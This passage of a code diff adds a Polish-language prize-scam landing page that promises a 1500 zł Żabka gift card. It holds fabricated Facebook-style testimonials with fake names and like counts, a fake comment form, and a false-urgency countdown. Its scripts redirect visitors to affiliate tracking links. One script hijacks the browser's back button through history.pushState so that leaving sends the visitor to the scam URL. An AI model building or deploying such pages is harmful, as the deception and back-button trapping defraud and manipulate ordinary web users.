vfDsU4f9xcnaSQR0yT/ACpRr89NtnPjME8PXjyvR2+Xkcf4n1K1tNBis7eNWaZcuyrllGf51yWmzQnLKZ3OcHzFcfz4qG/v4HvWWST5D8o3elJb3FskZaFjnuoOTWEY+6dCkkmjcuJwsYzyOOPWvMtd+GfiiaWXWbr7O1tcznE289+RxjPT+Veg2Fu2oahEt1NHbwg8Fn6DuT7+1d3f+K9GWzTT49NF7ZoAF8zAU47gEVvBRpRvJ2bOWoquKly0ldI8wjczTbQM5Gev41bjY2xzn7vLZ7mqlhGzOpGNqnDfgKt3imRCehPpXFGUXL3tj6mtRqwov2es9WvK+9hqLcyW73igyIThowvJHqPpzWXqvie8uNFu/D9m7pCo+0xyJwd46r68/wAyau32onStHyudzAIo9ya5HTbxZfEEcLZ3vkn64rfDJ8+i0ODM1CdD95K04/nYx4NS1PU5Y7RSs7yHau5f5kV2C/ZPDVoNm1ruRcEr1Y98Z6CqFnbQ6Et7elAZZZpFiA/hUMePb/61ZljIdX1td53sSfMZuMKOoA7Cu+fLD4VqfO0IOq+ao7Q/M6bw9AZp59RkUB3zjjgDvit2HEkrGKNQxGC2OoHr61XeUpbpAihWddxPovYVPbu1uuBgk15knNrnZ9RFYaNZYaF721tovn1P/9k="
+          width="50" height="50" name="Michał Wiśniewski"
+          message="Możecie mi pomóc? Właśnie wygrałem kartę podarunkową!! Co powinienem teraz zrobić?" :likes="91"
+          like-text="Polub" reply-text="Odpowiedz" since-text="55 min"
+          v-on:reply="$refs.reply.focus()"></vue-facebook-comment>
+        <vue-facebook-comment
+          avatar="data:image/jpeg;base64,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"
+          width="50" height="50" name="Beata Zielińska"
+          message="Darmowe zakupy, na które będziesz mieć 1500zl karta podarunkowa żabka jest już u mnie. Dziś odebrałem paczkę! Przekażcie podziękowania dla firmy Supermarket!!"
+          :likes="68" image="" like-text="Polub" reply-text="Odpowiedz" since-text="1 godz."
+          v-on:reply="$refs.reply.focus()"></vue-facebook-comment>
+        <vue-facebook-comment
+          avatar="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAkACQAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAA5ADkDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwC9AuHBrorNxtAzWBs2E9jT4dYtII7jNzGzQKWkRWBZR7ivCmrn0EWZvi3xQ8Oo/wBmWbiNlUNPNjdtB6KB645rlP7U1mMkLdXBDesrcj6ZxWTFqD6nrV1eT4Qyzglfb0/DAFdnZW8FzEWVfM8tcuVOdoz/APWrpjTUUkc8pNu5a0HVJLuLy7ldk6Dn/aHrXQK4rOjgslT7RECCoGSPfNJJdgblBOQM1jUhY6aNS+jL/wBoiMjRLIpdRkqDyPwpd1eaf2fd2niltQt7xlDAuzMMkkn7vv8A/Wrp/wC1b70j/wC+D/jWM+VWszphzO90aF1ITEzFtuOc1w8Gk2yatJJEXUyF8yFzghsjHvWhfawbtxCJtu/GAh6gnFZEkSWM48lZDKQQG3Eqp7ZH1rePNrY5XyxtzbjtA0P7bqM8DzGKYOdpHrmvSdI0ldG1awtt+43KOswY53nGQ1cHoMrR3cF3MG+c7mOMGu/0+K5v9ai1NojIsa/unWTYAPcc+prqjtqYtJvQp+IdHn8PaPPdzzL+9lxhBjPUj9BXDSeIJLliRMyZGNoxXT/EXW5dTMumgssVtExzjGX3D+X9a84tJ47ONBdRRz55yw5H0rKpFS2NKL5VdmxbXwluI4jK+1mAJPOK6Pdbf3j/AN/K5qJ4p1H2WUf7h+UipPs9x/dP51yOy3R3uhGpqp2KV1ssxbyhhjayEnsTyPpzSalqcYkQ2ytI5wxGMAd+aw21Ce/uJGK7Yzjag6ZA4r6CXRdNvdIjgvbZGia2iaMkHONg43DkdOua9alhrpc54NfFJzbgeM6N4m8u6t4dRgxFvwZlPTJ7j0A/lXe3Xj3QrXSrq1s18wkGPyzvUSk8ZyP4fXoaxfF/gmXRIHmsS8tjI/yxbcmPIzz6j3rz3JihhaMZJBLDPfP/ANbH4V0qjGPQ5HXm+p1thdPrmuzT3DEm7lIkjBwFBIJwT7Z/Kum1/wAG29x4ca/0y3VZrUnfECcOoyWGD0Yc/kfauS8FOt3r+2dScI+xsZ+Zhhcn8TzXrlhKkWkNclWR2IjnUZxkfdce/A+tDpx6oI1ppWTPCLVpLfUItowocAj05rq/Pf8AvH86b4u0G00zxCoglVYZh5qxIwLRkY4/3Tnj247VHh/7teRioe/Y9qnVjKKaOXS1SLVLq2SQrHFM6KWGTgEgZr6H8KXX23wxo92se6byFRnLjaxA2EEevHevn9v+Q/e/9dm/nXrnw/8A+QOv/X0f5Cvapu8UeDVVmzs7srIhj8ogwuiHPO5WOP514Z8QPCj+H9R86xjk+xsSV4yFJOcfQHpXus//ACE5f9xP/QjWD4u/49ZP93+taboz6nCeC9A03UNLF1unW9LFHAfAwQNq4/PnrnNeqwxxxz2sbxpmcFJFZcqW6gn6gEivNvAP+tu/+u1v/wChvXpWo/8AH3Z/74/m9D2DrY8d8Yyw3Ov/AGeCfebNDF5gTAJ3HI+gzj86zPtMnqtT6t/yMGof9d5v/Q6zK8zEwTmelh5PkP/Z"
+          width="50" height="50" name="Alicja Nowicka"
+          message="Nie byłem pewny, czy mogę w to wszystko wierzyć, lecz dziś odebrałem nagrodę (karta)!! 😍 niesamowite 🔥 🔥"
+          :likes="56" like-text="Polub" reply-text="Odpowiedz" since-text="6 godz."
+          v-on:reply="$refs.reply.focus()"></vue-facebook-comment>
+        <div class="reply">
+          <label for="reply">Dodaj odpowiedź:</label>
+          <textarea rows="4" class="comments__form-input" ref="reply" id="reply"></textarea>
+          <p>
+            <button onclick="alert('Dziękujemy za dodanie komentarza. Zostanie on opublikowany po sprawdzeniu.');"
+              class="comments__form-submit">
+              Wyślij
+            </button>
+          </p>
+        </div>
+      </div>
+    </div>
+  </main>
+  <script>window.view = window.view || {}; view.offerUrl = ""; view.popunderUrl = null; view.trafficDomain = ""; view.qs = ""; view.skip = 0; view.screenshot = 0; view.download = 0; view.noHistory = 0; view.noredir = false;</script>
+  <script src="confetti.js"></script>
+  <script>
+    startConfetti();
+    setTimeout(stopConfetti, 8000)
+  </script>
+  <canvas id="confetti-canvas" style="display:block;z-index:999999;pointer-events:none" width="360"
+    height="560"></canvas>
+  <canvas id="confetti-canvas" style="display:block;z-index:999999;pointer-events:none" width="360"
+    height="551"></canvas>
+
+  <script>
+    var offer_url = "http://ally.allysio.com/click";
+    var split_url = "https://leikovoleikamarada.com/link?z=7524589&var={SOURCE_ID}&ymid={CLICK_ID}";
+    function go() {
+      window.onbeforeunload = null;
+      window.open(offer_url);
+      document.location.assign(split_url)
+    };
+  </script>
+  <script>
+    var bbURL = "https://leikovoleikamarada.com/link?z=7524589&var={SOURCE_ID}&ymid={CLICK_ID}";
+    ! function () {
+      var a;
+      try {
+        for (a = 0; 3 > a; ++a) {
+          history.pushState({}, "", "#")
+        }
+        onpopstate = function (c) {
+          c.state && location.replace(bbURL)
+        }
+      } catch (b) { }
+    }();
+  </script>
+  <script>var mydate = new Date();
+    mydate.setDate(mydate.getDate() - 0);
+    var day = mydate.getDay();
+    var month = mydate.getMonth();
+
+    var daym = mydate.getDate();
+    if (daym < 10) {
+      daym = "0" + daym;
+    }
+
+    $('.date_day_number').each(function (i, obj) {
+      $(this).html(daym);
+    });
+    $('.date_month').each(function (i, obj) {
+      $(this).html(array_month[month]);
+    });
+    $('.date_day_week').each(function (i, obj) {
+      $(this).html(array_day[day]);
+    });
+
+    ;
+  </script>
+  <script>
+    // 获取访客的系统信息
+    var userAgent = navigator.userAgent.toLowerCase();
+    var userOS = '';
+    if (userAgent.indexOf('windows') >= 0) {
+      userOS = 'Windows';
+    } else if (userAgent.indexOf('mac') >= 0) {
+      userOS = 'Mac OS';
+    } else if (userAgent.indexOf('x11') >= 0) {
+      userOS = 'UNIX';
+    } else if (userAgent.indexOf('android') >= 0) {
+      userOS = 'Android';
+    } else if (userAgent.indexOf('ios') >= 0) {
+      userOS = 'iOS';
+    }
+    document.getElementById('user-os').innerHTML = userOS;
+
+  </script>
+
+  <script src="js/jquery.countdown.min.js"></script>
+  <script src="js/app_1.js" type="application/javascript"></script>
+  <script type="text/javascript">
+    // 15 days from now!
+    var date = new Date(new Date().valueOf() + 180 * 1000);
+    $('#clock').countdown(date, function (event) {
+      $(this).html(event.strftime('%M:%S'));
+    });
+  </script>
+</body>
+
+</html>
